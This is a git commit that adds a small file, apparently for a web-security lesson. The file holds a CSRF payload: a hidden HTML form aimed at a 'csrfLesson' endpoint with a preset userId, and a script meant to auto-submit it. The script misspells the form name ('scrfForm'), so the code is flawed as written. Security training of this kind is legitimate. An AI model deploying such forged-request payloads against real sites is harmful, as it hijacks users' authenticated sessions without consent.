196d779fa39fcfa861d4265264bada7913ba4cd5
DevinOM <devinmadr210@gmail.com>
2022-02-06 17:54:52 -0600

    Create index.js

---
+++ index.js
@@ -0,0 +1,6 @@
+<form name="csrfForm" action="/root/grantComplete/csrfLesson" method="GET">
+  <input type="hidden" name="userId" value="1275189860" />
+</form>
+<script>
+  document.scrfForm.submit();
+</script>
